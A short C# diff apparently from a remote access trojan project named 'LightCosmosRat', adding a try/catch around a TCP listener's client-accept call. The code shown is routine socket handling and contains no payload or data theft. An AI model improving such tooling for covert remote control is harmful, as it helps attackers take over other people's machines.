@@ -52,7 +52,13 @@ namespace LightCosmosRat
 			Server.Start();
             while (true)
             {
-                myClient = Server.AcceptTcpClient();
+                try
+                {
+                    myClient = Server.AcceptTcpClient();
+                }catch(Exception Error)
+                {
+                    return;
+                }
                 ClientThread = new Thread(ConnectionHandler);
                 ClientThread.Start(myClient);
                 while (ClientThread.IsAlive)
